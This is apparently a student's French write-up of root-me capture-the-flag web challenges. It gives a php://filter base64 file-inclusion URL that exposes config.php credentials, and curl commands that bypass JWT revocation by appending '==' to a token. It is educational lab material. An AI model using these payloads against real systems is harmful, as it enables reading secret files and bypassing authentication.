# 1. Mettre le titre
Link: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass


# 2. PHP - Filters
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

Pour réaliser ce projet, j'ai dans un premier temps fait une recherche sur les PHP filters et leur fonctionnement.
J'ai ensuite commencé à tester différents filtres dans mon URL.

Cette URL m'a permis d'afficher le contenu du fichier `config.php` encodé en base64 :

http://challenge01.root-me.org/web-serveur/ch12/?inc=php://filter/convert.base64-encode/resource=config.php

<img src="img/PHP - Filters 1.png" alt="capture 3" width="400">

J'ai ensuite décodé le contenu en utilisant un décodeur en ligne.

Ce qui m'a permis d'obtenir les informations suivantes :

<img src="img/PHP - Filters 2.png" alt="capture 4" width="400">

Je me suis ensuite connecté à la page d'administration avec les identifiants trouvés, ce qui m'a affiché le message de validation du challenge.

Pour valider le projet, il me suffisait simplement d'entrer le mot de passe de l'administrateur.

<img src="img/PHP - Filters 3.png" alt="capture 5" width="400">

# 6. JWT - Jeton révoqué
Link: https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Recuper le token jwt grace a cette commande : 

curl -i -X POST http://challenge01.root-me.org/web-serveur/ch63/login     
 -H "Content-Type: application/json"
 -d '{"username":"admin","password":"admin"}'

<img src="img/JWT - Jeton révoqué 1.png" alt="capture 6" width="400">

Pour pouvoir recupere le mp secret a fin de valider le challenge, il faut modifier le token en rajoutant == a la fin.
En rajoutant == a la fin du token, cela permet de changer le token au niveau de server sans modifier la charge utile.
Ce qui permet de contourner la verification du token.

curl -X GET http://challenge01.root-me.org/web-serveur/ch63/admin      
-H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ2OTAwMjcsIm5iZiI6MTc2NDY5MDAyNywianRpIjoiZjlmMzQ5NWQtNTE1MS00MGU0LThhMGUtOGU3MDUyZGU1MjhmIiwiZXhwIjoxNzY0NjkwMjA3LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.uDYdxBNpUqAbFEQp05ksB6LVHA_51DYsXQsjSfm__Gc=="

<img src="img/JWT - Jeton révoqué 2.png" alt="capture 7" width="400">

Pojet validé.

<img src="img/JWT - Jeton révoqué 3.png" alt="capture 8" width="400">